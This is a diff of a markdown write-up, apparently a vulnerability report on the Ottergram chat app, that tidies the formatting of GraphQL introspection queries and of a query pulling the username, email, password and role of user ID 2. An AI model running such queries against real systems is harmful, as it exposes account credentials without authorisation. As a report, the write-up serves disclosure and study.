@@ -40,15 +40,15 @@ I found a serious security issue in the Ottergram chat application where the Gra
 _This asks the GraphQL system: "Show me all the different types of data you have and what information each type contains."_
 
 **Step 2: Finding Available Queries**
-	`{
-	  `"query": "{ __schema { queryType { fields { name description } } } }"
-	`}
+	{
+	  "query": "{ __schema { queryType { fields { name description } } } }"
+	}
 _This asks: "What specific questions am I allowed to ask you?" It revealed the hidden `user` query._
 
 **Step 3: Getting Admin Credentials**
-	`{
-	  `"query": "query { user(id: 2) { username email password role } }"
-	`}
+	{
+	  "query": "query { user(id: 2) { username email password role } }"
+	}
 _This asks: "Give me the username, email, password, and role for the user with ID number 2."_
 
 ## What Happened Behind the Scenes
